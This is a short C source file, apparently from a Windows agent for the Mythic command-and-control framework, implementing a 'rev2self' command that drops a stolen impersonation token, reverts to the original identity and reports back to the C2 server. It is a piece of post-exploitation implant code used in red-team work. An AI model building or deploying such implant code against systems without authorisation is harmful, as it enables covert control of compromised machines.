#define _WIN32_WINNT 0x0600
#include "Checkin.h"
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#ifdef INCLUDE_CMD_REV2SELF

void command_rev2self(char *task_id, char *params) {
  (void)params;

  /* Free the stored impersonation token */
  if (g_stolen_token != NULL) {
    CloseHandle(g_stolen_token);
    g_stolen_token = NULL;
  }
  clear_netonly_state();

  RevertToSelf();

  // Trigger immediate checkin to update Mythic UI
  char display_user[512] = {0};
  get_current_display_user(display_user, sizeof(display_user));
  CheckinSend(display_user);

  char msg[640];
  snprintf(msg, sizeof(msg),
           "Reverted to original token. Identity updated to: %s", display_user);
  send_task_response(task_id, msg);
}

#endif
